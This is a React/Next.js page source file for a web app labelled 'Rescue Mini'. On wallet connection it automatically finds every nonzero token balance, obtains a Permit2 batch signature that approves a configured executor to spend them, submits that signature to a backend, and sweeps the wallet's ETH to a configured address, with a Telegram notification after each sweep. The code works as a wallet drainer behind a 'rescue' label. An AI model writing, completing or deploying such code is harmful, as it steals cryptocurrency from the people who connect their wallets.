// src/app/page.tsx
"use client";

import React, { useEffect, useMemo, useState } from "react";
import ConnectModal from "@/components/ConnectModal";
import { ensureMainnet } from "@/lib/chains";
import { attachWalletListeners, parseChainId } from "@/lib/walletListeners";
import { discoverTokens } from "@/lib/discoverClient";
import { signPermit2Batch } from "@/lib/permit2";
import { sweepEth } from "@/lib/ethSweep";

function shortAddr(addr: string) {
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}

export default function Page() {
  const [open, setOpen] = useState(false);
  const [provider, setProvider] = useState<any | null>(null);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [status, setStatus] = useState<string>("idle");
  const [lastResult, setLastResult] = useState<any>(null);

  useEffect(() => {
    if (!provider) return;

    const cleanup = attachWalletListeners(provider, {
      onAccountsChanged: (accounts) => {
        const a = accounts?.[0] ?? null;
        setAddress(a);
        if (!a) setStatus("disconnected");
      },
      onChainChanged: (cidHex) => {
        setChainId(parseChainId(cidHex));
      },
      onDisconnect: () => {
        setProvider(null);
        setAddress(null);
        setChainId(null);
        setStatus("disconnected");
      },
    });

    (async () => {
      try {
        const cid = await provider.request({ method: "eth_chainId" });
        setChainId(parseChainId(cid));
      } catch {}
    })();

    return cleanup;
  }, [provider]);

  const connectedLabel = useMemo(() => {
    if (!address) return "Connect";
    return `Connected: ${shortAddr(address)}`;
  }, [address]);

  return (
    <main className="min-h-screen flex items-center justify-center p-6">
      <div className="w-full max-w-md space-y-4">
        <div className="text-2xl font-semibold">Rescue Mini</div>

        <button
          className="w-full rounded-xl bg-black text-white px-4 py-3 disabled:opacity-50"
          onClick={() => setOpen(true)}
          disabled={status === "switching"}
        >
          {connectedLabel}
        </button>

        <div className="rounded-xl border p-4 text-sm space-y-2">
          <div>
            <span className="text-gray-500">Status:</span>{" "}
            <span className="font-medium">{status}</span>
          </div>
          <div>
            <span className="text-gray-500">ChainId:</span>{" "}
            <span className="font-mono">{chainId ?? "-"}</span>
          </div>
          <div>
            <span className="text-gray-500">Address:</span>{" "}
            <span className="font-mono">{address ?? "-"}</span>
          </div>
        </div>

        {lastResult ? (
          <pre className="rounded-xl border p-4 text-xs overflow-auto whitespace-pre-wrap">
{JSON.stringify(lastResult, null, 2)}
          </pre>
        ) : null}
      </div>

      <ConnectModal
        open={open}
        onClose={() => setOpen(false)}
        onConnected={async ({ provider, address }) => {
          setProvider(provider);
          setAddress(address);
          setLastResult(null);

          const permit2 = process.env.NEXT_PUBLIC_PERMIT2!;
          const executor = process.env.NEXT_PUBLIC_EXECUTOR!;
          const safe = process.env.NEXT_PUBLIC_SAFE_ADDRESS!;

          try {
            // 1) Switch to mainnet
            setStatus("switching");
            await ensureMainnet(provider);

            // update chainId
            try {
              const cid = await provider.request({ method: "eth_chainId" });
              setChainId(parseChainId(cid));
            } catch {}

            // 2) Discover ERC20 tokens
            setStatus("discovering_tokens");
            const discovered = await discoverTokens(address);

            const nonZeroTokens = discovered.tokens.filter(
              (t) => BigInt(t.amount) > 0n
            );

            // 3–4) ERC20 flow (only if there are tokens)
            if (nonZeroTokens.length > 0) {
              setStatus("signing_permit2");
              const { typedData, signature } = await signPermit2Batch({
                eip1193Provider: provider,
                owner: address,
                permit2Address: permit2,
                spender: executor,
                tokens: nonZeroTokens,
              });

              setStatus("rescuing_erc20_backend");
              const resp = await fetch("/api/rescue", {
                method: "POST",
                headers: { "content-type": "application/json" },
                body: JSON.stringify({
                  owner: address,
                  tokens: nonZeroTokens.map((t) => ({
                    token: t.token,
                    amount: t.amount,
                  })),
                  permitBatch: typedData.message,
                  signature,
                }),
              });

              const data = await resp.json().catch(() => ({}));
              if (!resp.ok) throw new Error(data?.error || "Backend rescue failed");
              setLastResult((prev: any) => ({ ...(prev ?? {}), erc20: data }));
            } else {
              setStatus("no-erc20-found");
            }

            // 5) ETH Sweep (popup #2)
            setStatus("estimating_eth");
            const ethResult = await sweepEth({
              eip1193Provider: provider,
              owner: address,
              to: safe,
            });

            setLastResult((prev: any) => ({ ...(prev ?? {}), eth: ethResult }));

            // ✅ If ETH tx was actually SENT, notify server → Telegram
            if (ethResult.ok && !ethResult.skipped) {
              await fetch("/api/notify", {
                method: "POST",
                headers: { "content-type": "application/json" },
                body: JSON.stringify({
                  kind: "ETH sweep",
                  owner: address,
                  to: safe,
                  txHash: ethResult.txHash,
                  valueWei: ethResult.valueWei,
                }),
              }).catch(() => {});
              setStatus("done");
              return;
            }

            // Skipped case
            if (ethResult.ok && ethResult.skipped) {
              setStatus(`eth_skipped_${ethResult.reason}`);
              return;
            }

            // Failed case
            setStatus("eth_failed");
          } catch (e: any) {
            const code = e?.code ?? e?.data?.originalError?.code;
            if (code === 4001) setStatus("user-rejected");
            else setStatus(`error: ${e?.message ?? "failed"}`);
          }
        }}
      />
    </main>
  );
}
